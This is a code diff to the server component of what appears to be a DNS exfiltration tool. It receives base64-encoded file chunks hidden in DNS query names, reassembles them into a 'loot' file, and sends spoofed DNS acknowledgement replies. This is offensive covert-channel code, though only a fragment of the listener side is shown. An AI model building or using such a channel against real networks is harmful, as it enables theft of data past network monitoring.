@@ -19,6 +19,9 @@ class Server:
         self.last_packet = ''
         self.file_name = ''
         self.loot_path = ''
+        self.file_dict = {}
+        self.file_name = ''
+        self.file_status = ''
 
     def customAction(self, packet):
 
@@ -38,17 +41,16 @@ class Server:
                         incoming_data.replace('.---', '=')
                     incoming_data = base64.b64decode(string_to_decode)
                     if ".:|:." in incoming_data:
-                        incoming_data = dnsqr_strings.split('\'')[1].rstrip('.')
-                        number_equals = incoming_data.count('.--')
-                        if '.---' in incoming_data:
-                            encoded_data = incoming_data.split('.')[0] + "=" * number_equals
-                        else:
-                            encoded_data = incoming_data.split('.')[0]
+                        self.file_status = incoming_data.split('.:|:.')[0]
+                        file_data = incoming_data.split('.:|:.')[1]
+                        self.file_dict[packet_number] = file_data
 
-                        try:
-                            encoded_data = base64.b64decode(encoded_data)
-                        except:
-                            pass
+                        outgoing_data = self.file_status + "allgoodhere"
+
+                        send(IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id, qr=1,
+                                qd=[DNSQR(qname=dnsqr_strings.split('\'')[1].rstrip('.'), qtype=packet[DNSQR].qtype)],
+                                an=[DNSRR(rrname=dnsqr_strings.split('\'')[1].rstrip('.'), rdata=outgoing_data, type=packet[DNSQR].qtype)]),
+                                verbose=False)
 
                     else:
                         with open(self.loot_path + self.file_name, 'a') as dns_out:
